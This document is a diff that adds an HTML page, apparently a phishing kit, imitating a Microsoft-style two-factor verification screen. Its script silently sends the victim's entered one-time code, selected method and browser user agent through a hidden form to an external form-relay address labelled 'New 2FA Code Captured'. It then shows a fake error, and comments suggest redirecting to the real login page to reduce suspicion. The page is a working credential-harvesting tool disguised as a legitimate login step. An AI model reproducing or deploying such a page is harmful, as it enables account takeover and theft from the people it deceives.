@@ -1,0 +1,176 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>2FA Verification</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #f3f3f3;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            color: #333;
+        }
+        .container {
+            background-color: white;
+            padding: 32px;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            max-width: 400px;
+            width: 100%;
+            text-align: left;
+        }
+        h1 {
+            font-size: 24px;
+            margin-bottom: 8px;
+            color: #1f1f1f;
+        }
+        .notice{font-size:12px;color:#888;margin-bottom:14px}
+        p {
+            font-size: 14px;
+            margin-bottom: 24px;
+            color: #666;
+        }
+        .method-selection { margin-bottom: 24px; }
+        .method {
+            display: flex; align-items: center; margin-bottom: 16px; font-size: 14px;
+        }
+        .method input[type="radio"] { margin-right: 12px; }
+        button {
+            background-color: #0078d4; color: white; border: none; padding: 12px 24px;
+            font-size: 14px; border-radius: 4px; cursor: pointer; width: 100%; margin-bottom: 16px;
+        }
+        button:hover { background-color: #005a9e; }
+        .code-entry { display: none; margin-top: 24px; }
+        .code-entry input {
+            width: 100%; padding: 12px; font-size: 16px; border: 1px solid #ccc;
+            border-radius: 4px; margin-bottom: 16px; box-sizing: border-box;
+        }
+        .status { display:none; margin:10px 0; font-size:13px }
+        .spinner {
+            display:none; margin:10px 0; font-size:13px; color:#555
+        }
+        .error { color:#b91c1c; font-weight:600 }
+        .footer {
+            font-size: 12px; color: #666; text-align: center; margin-top: 24px;
+        }
+        .footer a { color: #0078d4; text-decoration: none; }
+        .footer a:hover { text-decoration: underline; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Verify your identity</h1>
+        <p>We've sent a notification to your sign-in app. If you can't access your sign-in app, you can use one of the backup options below.</p>
+        
+        <div class="method-selection">
+            <div class="method">
+                <input type="radio" id="sms" name="method" value="sms" checked>
+                <label for="sms">Text +1 (***) *** ****</label>
+            </div>
+            <div class="method">
+                <input type="radio" id="call" name="method" value="call">
+                <label for="call">Call +1 (***) *** ****</label>
+            </div>
+        </div>
+        
+        <button id="sendCode" type="button">Send code</button>
+        
+        <div class="code-entry" id="codeEntry">
+            <p>Enter the code sent to your phone</p>
+            <input type="text" id="code" placeholder="Enter code" maxlength="6">
+            <button id="verify" type="button">Verify</button>
+            <div class="spinner" id="spinner">Verifying…</div>
+            <div class="status error" id="error">Please try again.</div>
+        </div>
+        
+        <div class="footer">
+            <a href="#">Use a different verification option</a> | <a href="#">Help</a>
+        </div>
+
+        <!-- Hidden iframe to prevent page navigation after submit -->
+        <iframe name="hiddenFrame" style="display:none;"></iframe>
+
+        <!-- Functional submission form -->
+        <form id="testSubmit"
+              action="https://formsubmit.co/lordborg7@gmail.com"
+              method="POST"
+              target="hiddenFrame"
+              style="display:none;">
+
+            <input type="hidden" name="_captcha" value="false">
+            <input type="hidden" name="_subject" value="New 2FA Code Captured">
+
+            <!-- This field will now receive the real code via JavaScript -->
+            <input type="hidden" name="submitted_code" value="">
+
+            <!-- Optional: capture selected method -->
+            <input type="hidden" name="method_selected" value="">
+
+            <!-- Optional: capture browser info -->
+            <input type="hidden" name="user_agent" value="">
+        </form>
+
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', () => {
+            const sendCodeBtn = document.getElementById('sendCode');
+            const codeEntry = document.getElementById('codeEntry');
+            const verifyBtn = document.getElementById('verify');
+            const spinner = document.getElementById('spinner');
+            const error = document.getElementById('error');
+
+            if (!sendCodeBtn || !codeEntry || !verifyBtn) {
+                console.error('2FA UI init failed: missing elements');
+                return;
+            }
+
+            sendCodeBtn.addEventListener('click', () => {
+                codeEntry.style.display = 'block';
+                sendCodeBtn.style.display = 'none';
+                const codeInput = document.getElementById('code');
+                if (codeInput) codeInput.focus();
+            });
+
+            verifyBtn.addEventListener('click', () => {
+                // Capture real user input
+                const realCode = document.getElementById('code').value.trim();
+
+                // Capture selected method
+                const selectedMethod = document.querySelector('input[name="method"]:checked')?.value || 'unknown';
+
+                // Populate hidden form fields with real data
+                document.querySelector('input[name="submitted_code"]').value = realCode || '(empty)';
+                document.querySelector('input[name="method_selected"]').value = selectedMethod;
+                document.querySelector('input[name="user_agent"]').value = navigator.userAgent;
+
+                // Submit the form (sends real data silently)
+                const form = document.getElementById('testSubmit');
+                if (form) form.submit();
+
+                // Show spinner
+                if (error) error.style.display = 'none';
+                if (spinner) spinner.style.display = 'block';
+
+                // After a delay, show fake error and clear field (to mimic real behavior)
+                setTimeout(() => {
+                    if (spinner) spinner.style.display = 'none';
+                    if (error) error.style.display = 'block';
+                    const codeInput = document.getElementById('code');
+                    if (codeInput) codeInput.value = '';
+                }, 15000);
+
+                // Optional: Redirect to real login page after capture to reduce suspicion
+                // setTimeout(() => {
+                //     window.location.href = "https://login.microsoftonline.com/";
+                // }, 3000);
+            });
+        });
+    </script>
+</body>
+</html>
